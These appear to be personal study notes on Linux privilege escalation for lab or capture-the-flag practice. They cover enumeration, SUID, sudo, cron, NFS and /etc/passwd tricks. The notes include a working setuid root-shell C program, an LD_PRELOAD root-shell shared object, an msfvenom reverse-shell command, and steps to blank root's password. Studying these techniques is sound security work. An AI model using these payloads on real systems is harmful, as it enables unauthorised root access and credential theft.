ENUMERATON-

Hostname
uname -a (additional detail about the kernel used by the system) 
/proc/version (information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.)
/etc/issue ()
ps command - ps aux, ps -A, ps axjf
env - environmental variables
sudo -l 
ls
ls -l
id
/etc/passwd - cat /etc/passwd | cut -d ":" -f 1 (get the users list for bruteforce)
history
ifconfig
ip route
netstat - netstat -at (tcp port) - netstat -au (udp) - netstat -l (all port) - netstat -s (output with statistics) - netstat -ltp 
find -

`````````Find files:

find . -name flag1.txt: find the file named “flag1.txt” in the current directory
find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
find / -type d -name config: find the directory named config under “/”
find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
find / -perm a=x: find executable files
find /home -user frank: find all files for user “frank” under “/home”
find / -mtime 10: find files that were modified in the last 10 days
find / -atime 10: find files that were accessed in the last 10 day
find / -cmin -60: find files changed within the last hour (60 minutes)
find / -amin -60: find files accesses within the last hour (60 minutes)
find / -size 50M: find files with a 50 MB size
This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size.````
---------
Folders and files that can be written to or executed from:

find / -writable -type d 2>/dev/null : Find world-writeable folders
find / -perm -222 -type d 2>/dev/null: Find world-writeable folders
find / -perm -o w -type d 2>/dev/null: Find world-writeable folders


find / -perm -o x -type d 2>/dev/null : Find world-executable folders
Find development tools and supported languages:

find / -name perl*
find / -name python*
find / -name gcc*


find / -perm -u=s -type f 2>/dev/null
--------------








User accounts are configured in the /etc/passwd 
User hashes are stored in the /etc/shadow
Root uid = 0
Groups are configured in the /etc/group 


Ways to spawn root....
Create copy of /bin/bash executable file (rootbash) should run as root, also has suid bit set.(execute rootbash with -p)

Instances where root process execute another process which you can control? Here's your answer 👇

int main() {
    setuid(0);
    system("/bin/bash -p");
}

compile with;
$ gcc -o <<name >> <<filename.c>>

(CUSTUM EXECUTABLE ☝️)

(Msf venom) - incase of reverse shell then create .elf executable 

msfvenom -p linux/x86/shell_reverse_tcp LHOST=<<ip>> LPORT=<<port>> -f elf > shell.elf 
(Catch shell with netcat or metasploit multi/handler 


Native reverse shells🐚 
So many ways;
Tool - https://github.com/mthbernardes/srg
All caught with simple reverse shells......


Kernel exploit;
Kernel the core of any operating system.
Layer between application software & actual computer hardware.
Exploiting kernel lead to being root.

Finding kernel exploit;
Enumerate kernel version (uname -a)
Find matching exploit(google,exploitDb,github)
Compile & run.
(Can be unstable & maybe one shot or cause system crash aka LAST RESORT).
Tool - linux exploit suggester (github)


System exploit;
Services simply are programs that run in the background, accepting input or performing regular tasks.
If vulnerable services are running, exploiting them can learn to RCE as root.
Can be found using google, github, searchsploit .

(SERVICES RUNNING AS ROOT)
Show processes running as root - $ ps aux | grep “^root” 

With any results, find the version number of program being executed 

(Enumerating program versions) 
Running program with - - version or -v shows program version ($ python -v) ($python - -version)
On Debian distro dpkg can show installed program version ($ dpkg -l or 1 lol | grep <program>) 
On system that use rpm ($ rpm -qa | grep <program>)


(Port forwarding)
In some instance some root processes can be bound to an internal port through which it communicates.
If for some reason exploit can’t run locally in target machine, port can be forwarded using ssh to local machine.($ ssh -R <local-port>:127.0.0.1:<service-port> <username>@<local-machineip>
Exploit code can run now on local machine at whichever chosen port 



Weak file permissions; 
Some system files can be taken advantage of to perform privilege escalation of permissions set on them are weak. 
If a file have confidential messages on them, it may be used to gain access to root account. 
If a file system file can be written to we may well be able to modify the way the operating system works & gain access to root 

Takeaways;
The /etc/shadow file which contain password hashes is readable to root user only.
We can crack root user hash if we can read /etc/shadow file.
We can modify new password hash to /etc/shadow if we have writeable perms for it.

/etc/passwd
Tl;dr for backwards compatibility if second field of user row in /etc/passwd contains password hash, it takes precedent over the hash in /etc/shadow.
If we can write to /etc/passwd we can easily write a known password hash for the root user & use su command to switch to root user.
If we can append to the file, we can create a new user & assign them root user id (0). (Linux allows multiple entries for same user id as long as username is different)

Root user account configuration;
root:x:0:0:root:/root:/bin/bash
(x in second field instructs Linux to look for password hash from /etc/shadow file.

In some Linux version it is possible to simply delete x which interprets as user having now password;
root::0:0:root:/root:/bin/bash

Backups;
/root
/tmp
/var/backups

Check if permissions allowed for ssh;
$ grep PermitRootLogin /etc/ssh/sshd_config



Sudo;
Users generally have to enter password to use sudo & they must be permitted via rule(s) in the /etc/sudoers file.
Rules can be used to limit users to certain programs & forgo password entry.

List programs a user Is allowed to run as sudo;
($ sudo -l)

Known password? Then sudo su to spawn root shell. 
Others;
sudo -s
sudo -i
sudo passwd
sudo /bin/bash

Shell escape sequence;
Gtfobins 😎

Abuse intended functionality;
If a program doesn’t have escape sequence, it may still be possible to priv Esc 
If we can read files owned by root, we may obtain useful information (passwords, hashes, keys) - ($ sudo <readablefilename> -f /etc/shadow)
If we can write to file owned by root? We may insert/modify information 

Environment variables;
Programs run through sudo can inherit user environment variables.
In the /etc/sudoers config file, if the env_reset option is set, sudo will run programs in new, minimal environment 
env_keep option can be used to keep certain environment variables from user environment.

Ld_preload;
Environment variable that can be set to path of shared object (.so) file.
When set, the shared object will be loaded before others.
By creating a shared object & creating init() function, we can execute code as soon as object is loaded. 
Ld_preload wont work if real user Id is different from effective user Id.
Sudo must be configured to preserve the Ld_preload environment variable using the env_keep option.


LD_PRELOAD and NOPASSWD

If LD_PRELOAD is explicitly defined in the sudoers file

Defaults        env_keep += LD_PRELOAD
Compile the following shared object using the C code below with gcc -fPIC -shared -o shell.so shell.c -nostartfiles

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
Execute any binary with the LD_PRELOAD to spawn a shell : sudo LD_PRELOAD=<full_path_to_so_file> <program>, e.g: sudo LD_PRELOAD=/tmp/shell.so find









Ld_library_path;
ldd command can be used to print the shared libraries used by a program. 
($ ldd /usr/sbin/apache2)
Creating a shared library with same name as that used by a program & setting ld_library_path to parent directory, the program will load our shared library instead.


Cron Jons;
This run with security level of user owner.
Are run by default using /bin/sh with limited environment variables.

Crontable files;
User crontabs are usually located in /bar/spool/cron or /var/spool/cron/crontabs
System wide crontab is located at /etc/crontab


File perms;
Misconfiguration of file perms associated with cron jobs can lead to Priv Esc.
If we can write to a program or script which gets run as part of a cron job, we can replace with our own code.

Path Environment variable;
Crontab path environment variable by default is set to /use/bin:/bin
The Path variable can be overwritten in crontab file.
If a cron job program/script does not use an absolute path, and one of the path directories is writeable by our user, we may be able to create a program/script with the same name as the cron job. 

Wildcard;



Suid & Sgid files;
Suid files get executed with privileges of the file owner.
Sgid files get executed with privileges of file group.
If the file is owned by root, it get executed with root privileges & we may priv Esc with it.
Find suid/Sgid set files? ($ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
By default suid/Sgid files Aren’t exploitable.
 

Shell escape sequence;
Gtfobins 

Ld_preload & ld_library_path;
By default we can’t use same tricks as the sudo one. It’s disabled 
Both environment variables get Ignored when suid files are executed.

Known exploits;
Certain programs install suid files to aid their operation.
Suid files can have vulnerabilities also.
Can be found in github, google, searchsploit just like kernel or services exploits.


Shared objects injection;
Use strace to track system calls & determine whether any shared objects were or were not found.
If we can write to the location the program tries to open, we can create a shared object & spawn root shell when it’s loaded.


Path environment variable;


Finding vulnerable programs;
If a program executes another, the name of the program is likely embedded in the executable file as a string. 
Run strings, strace or ltrace to find string characters or trace.
($ strings <path/to/file>)
($ strace -v -f -e execve <command> 2>&1 | grep exec)
($ ltrace <command>)


Abusing shell features;




Password & keys;
Weak passwords storage & password reuse can be used for priv Esc.
Root user password hash can be stored in /etc/shadow while other passwords suck as those for services can be stored as plaintext in config files.


History files;
If user types password as part of command, then this password can get stored in a history file. 
Look for open/accessible config files.
Ssh private key can be used to ssh to root.




NFS;
Network file system
Configuration file can be found in /etc/exports
Remote users can mount shares, access, create & modify files.
By default created files inherit remote users Id & group id (as owner & group respectively) even if they don’t exist in NGS server.
Show NFS server exploit list;
($ showmount -e <target>)
Mount NFS share;
($ mount -o rw,vers=2 <target>:<share> <local_directory>)


Root squashing;
This is how NFS prevent priv Esc.
This is default but can be disabled.


No_root_sqaush;
This is an NFS config option that disables root squashing. 
When included in a writable share configuration, a remote user who identifies as root can create files on the NFS share as the local root user. 




Priv Esc Strategy;
Enumeration...
Check user (whoamI)
Run Linux smart enumeration script
Run LinEnum & other scripts 
If fails then run manual command from - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
Look at user home directory. (/var/backups, /var/logs)
Read history files
Try priv Esc techniques without a lot of steps first eg sudo, suid, cron jobs 
Look at root process, enumerate versions, search exploits.
Check for internal ports to forward to attacking machine. 
